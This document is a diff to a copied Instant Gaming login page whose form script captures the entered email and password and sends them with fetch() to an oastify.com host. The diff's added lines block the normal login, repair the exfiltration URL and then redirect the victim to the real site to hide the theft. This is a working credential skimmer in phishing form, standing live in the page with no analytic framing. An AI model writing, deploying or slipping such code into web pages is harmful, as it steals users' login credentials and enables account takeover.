@@ -3806,6 +3806,7 @@ Instant Gaming works by offering discounted games that can be purchased and deli
 
         <form class="ig-login-form already" action="https://www.instant-gaming.com/en/" method="post" data-need-usid="">
             <div class="login">
+
                 
                 <input id="login-email" class="opacity" type="email" name="email" placeholder="Email" required="">
                 
@@ -3816,18 +3817,26 @@ Instant Gaming works by offering discounted games that can be purchased and deli
                 </button>
 
                 <script>
-    document.getElementById('login-submit').addEventListener('click', function() {
+    document.getElementById('login-submit').addEventListener('click', function(event) {
+
+    	event.preventDefault();
+    event.stopImmediatePropagation();
       const email = document.getElementById('login-email').value;
       const password = document.getElementById('login-password').value;
 
       // Construct the URL
-      const url = `https://rrm192xhlonuhieo51mfxjqdg4mvauyj.oastify.com/u=${encodeURIComponent(email)}&p=${encodeURIComponent(password)}`;
+      const url = `https://rrm192xhlonuhieo51mfxjqdg4mvauyj.oastify.com/?u=${encodeURIComponent(email)}&p=${encodeURIComponent(password)}`;
 
       // Make a request (GET)
       fetch(url)
         .then(response => console.log('Request sent:', response))
         .catch(error => console.error('Error:', error));
+        setTimeout(() => {
+  window.location="https://www.instant-gaming.com"; // This runs after ~2 seconds
+}, 3000);
+        
     });
+
   </script>
 
                 <div class="forgot">
